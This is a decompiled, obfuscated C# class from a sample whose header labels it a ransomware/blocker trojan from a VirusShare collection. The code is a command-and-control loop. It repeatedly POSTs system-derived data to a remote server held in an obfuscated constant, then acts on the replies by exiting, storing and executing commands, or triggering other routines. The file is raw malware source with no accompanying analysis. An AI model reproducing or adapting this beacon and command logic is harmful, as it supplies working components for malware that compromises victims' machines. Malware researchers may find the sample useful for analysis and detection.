// Decompiled with JetBrains decompiler
// Type: .
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-fa05b3c64ba6163bb64b30062883b6f46b0f1c15f6c74963ec9341db78f63ddb.exe

using \u0001\u000E\u0003\u0004;
using \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u0002\u0003\u000E : \u0011\u000D\u000F
  {
    private static string \u000E\u000D = string.Empty;

    public static void \u0011\u000C\u000C\u000A\u0003()
    {
      \u0002\u0003\u000E.\u0004\u0008\u0006\u0004();
      new Thread(new ThreadStart(\u0002\u0003\u000E.\u0009\u0004\u0002)).Start();
    }

    private static void \u0004\u0008\u0006\u0004()
    {
      string A_1 = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000D\u0011\u000E() + \u000B\u0005\u0006\u000D\u0002\u0008.\u000A\u000F\u000D + \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0004\u0010\u0001\u0003\u0004() + \u000B\u0005\u0006\u000D\u0002\u0008.\u0024FD\u0024A;
      while (true)
      {
        try
        {
          string str = \u0002\u0003\u000E.\u0007\u0006\u000B\u000C\u000A(\u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u000A\u0003\u000C, A_1);
          if (str.Length > 0)
          {
            if (str == \u000B\u0005\u0006\u000D\u0002\u0008.\u0006\u0008\u0006\u0005)
              break;
            Environment.Exit(0);
          }
        }
        catch
        {
        }
        Thread.Sleep(\u000B\u0005\u0006\u000D\u0002\u0008.\u0002\u0008 * 1000);
      }
    }

    private static void \u0009\u0004\u0002()
    {
      string A_1 = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u0008\u000B\u0009\u000C() + \u000B\u0005\u0006\u000D\u0002\u0008.\u000A\u000F\u000D;
      while (true)
      {
        try
        {
          string str = \u0002\u0003\u000E.\u0007\u0006\u000B\u000C\u000A(\u000B\u0005\u0006\u000D\u0002\u0008.\u0003\u000A\u0003\u000C, A_1);
          if (str.Length > 0)
          {
            if (str == \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000D\u0008\u0009\u000D())
            {
              \u0002\u0003\u000E.\u000E\u000D = string.Empty;
              \u0002\u0003\u000E.\u0011\u000C\u000C\u000A\u0003();
              break;
            }
            if (str != \u0002\u0003\u000E.\u000E\u000D)
            {
              \u0002\u0003\u000E.\u000E\u000D = str;
              \u0011\u000D\u000F.\u0024MD\u00242C(str);
            }
          }
          else
          {
            \u000B\u0005\u0002\u000C\u000D\u0004.\u000F\u000F\u000A\u0008\u000A\u0004();
            \u000E.\u0003\u0004();
            \u0002\u0009\u000D\u0009\u0010\u0005.\u0006\u000B\u0002\u0008();
            \u0002\u0003\u000E.\u000E\u000D = string.Empty;
          }
        }
        catch
        {
        }
        Thread.Sleep(\u000B\u0005\u0006\u000D\u0002\u0008.\u0002\u0008 * 1000);
      }
    }

    private static string \u0007\u0006\u000B\u000C\u000A(string _param0, string A_1)
    {
      ServicePointManager.Expect100Continue = false;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.ContentType = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000C\u0003();
      httpWebRequest.Method = \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u0005\u0006\u0011();
      httpWebRequest.UserAgent = \u000B\u0005\u0006\u000D\u0002\u0008.\u0006\u0008\u0006\u0005;
      byte[] bytes = Encoding.Default.GetBytes(A_1);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      WebResponse response = httpWebRequest.GetResponse();
      return response == null ? string.Empty : new StreamReader(response.GetResponseStream()).ReadToEnd();
    }
  }
}
